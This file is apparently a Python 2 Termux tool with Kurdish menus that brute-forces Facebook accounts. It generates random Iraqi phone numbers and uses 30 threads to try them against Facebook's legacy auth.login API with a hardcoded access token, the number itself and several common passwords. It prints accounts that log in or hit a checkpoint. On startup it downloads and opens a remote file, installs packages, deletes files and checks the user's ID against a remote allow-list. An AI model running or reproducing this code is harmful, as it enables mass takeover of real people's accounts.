import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass, time, wget
os.system("rm -rf .fff.py")
os.system("rm -rf .txt")
wget.download("https://github.com/hedi44/fox/raw/main/.1.mp3")
os.system("xdg-open .1.mp3")
os.system("pkg install figlet")
os.system("y")
os.system("rm -rf .1.mp3")
for n in range(8000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    os.system("python2 .hhh.py")

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    os.system('python2 .hhh.py')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]


os.system('clear')
os.system('rm -rf list.txt')
os.system('id -u > list.txt')
uidd = open('list.txt', 'r')
for j in uidd:
    sp = j.split()

manglist = requests.get('https://raw.githubusercontent.com/968hacker/list/main/list.txt')
idd = manglist.text

def exb():
    print '[!] Exit'
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

hala = "  \033[31;1m 1\033[0;1m - La Regay Xera Ba ( \033[34mkorak \033[0;1m)\n\n  \033[31;1m 2 \033[0;1m- La Regay Kamek Xaw\n        Ba Be Check Point ( \033[34mkorak\033[0;1m )\n\n \033[31;1m  0 \033[0;1m- Darchwn la\033[31;1m Program\033[0;1m"
def t():
    os.system("clear")
    


def cb():
    os.system('clear')

               

back = 0
successful = []
cpb = []
oks = []
id = []
os.system("clear")

    
    
def menu():
    os.system('clear')
    os.system("xdg-open https://github.com/968hacker")
    time.sleep(1)
    print("\033[32m.")
    os.system("clear")
    os.system("figlet Welcome")
    print("\033[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[0;1m")
    print("   Auther: Zed\n   My Lion: Dark\n   Chenall telegram: @kak_zed_1")
 
    print("\033[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[0;1m")
    print(hala)
    print("\033[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[0;1m")
    action()


def action():
    global cpb
    global oks
    bch = raw_input(' Hall Bzhera Dlakam: ')
    if bch == '1':
        os.system("python2 .hhh.py")
        print ' halaya !'
        action()
    elif bch == '1':
    	os.system("python2 .hhh.py")
    elif bch == '2':
     	os.system('clear')
     	print("\033[32m.")
     	os.system("clear")
     	os.system("figlet Zed Coder")
     	print("\033[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[0;1m")
     	print '\033[32m 770-771-772-773-774\n  750-751-752-753-754\n   780-781-782-783-784\033[0;1m\n\033[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[0;1m'
     	try:
     	    k = '+964'
            c = raw_input('\033[90;1m Saratakay chi bet : ')
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '!'
            raw_input('\n[ Garanawa ]')
            menu()


    elif bch == '13':
        login()
    elif bch == '0':
        exb()
    else:
        print '!'
        action()
    xxx = str(len(id))
    psb('\033[31mHamw Zhmara Kan: ' + xxx)
    print '\033[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[0;1m'

    def main(arg):
        user = arg
        try:
            time.sleep(0.1)
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\033[1;32;40m[OK]\033[0m Zhmarakay: ' + k + c + user + ' Ramzakay: ' + pass1
            elif 'free.facebook.com' in q['error_msg']:
                print '[\033[31mCP\033[0;1m] Zhmarakay: ' + k + c + user + ' Ramzakay: ' + pass1
            else:
                pass2 = '1234512345'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                   print '\033[1;32;40m[OK]\033[0m Zhmarakay: ' + k + c + user + ' Ramzakay: ' + pass2
                elif 'free.facebook.com' in q['error_msg']:
                    print '[\033[31mCP\033[0;1m] Zhmarakay: ' + k + c + user + ' Ramzakay: ' + pass2
                else:
                    pass3 = '1122334455'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\033[1;32;40m[OK]\033[0m Zhmarakay: ' + k + c + user + ' Ramzakay: ' + pass3
                    elif 'free.facebook.com' in q['error_msg']:
                        print '[\033[31mCP\033[0;1m] Zhmarakay: ' + k + c + user + ' Ramzakay: ' + pass3
                    else:
                        pass4 = '123456123456'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\033[1;32;40m[OK]\033[0m Zhmarakay: ' + k + c + user + ' Ramzakay: ' + pass4
                        elif 'free.facebook.com' in q['error_msg']:
                            print '[\033[31mCP\033[0;1m] Zhmrakay: ' + k + c + user + ' Ramzakay: ' + pass4
                        else:
                            pass5 = '123454321'
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\033[1;32;40m[OK]\033[0m Zhmarakay: ' + k + c + user + ' Ramzakay: ' + pass5
                            elif 'free.facebook.com' in q['error_msg']:
                                print '[\033[31mCP\033[0;1m] Zhmarakay: ' + k + c + user + ' Ramzakay: ' + pass5
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '         '
    print 'Tawaw Bw ....'
    raw_input('\n[Enter Bka Bo Darchwn]')
    os.sys.exit()
    
    
    
for s in idd.split():
    print s
    if s == sp[0]:
        if __name__ == '__main__':
            menu()
else:
    os.system('clear')
    os.system("figlet ID ACTIVE")
    print("\033[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[0;1m")
    bani = '  \n  Bo Active Krdni Tool Akat\n\n           Massg Bka La Telegram @kak_zed\n'
    print bani
    print '       ID To Amaya ===> ' + sp[0]
    print("\033[90;1m\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[0;1m\n\n\n")
    time.sleep(1)
    os.system("xdg-open https://t.me/Kak_zed")
    os.sys.exit()
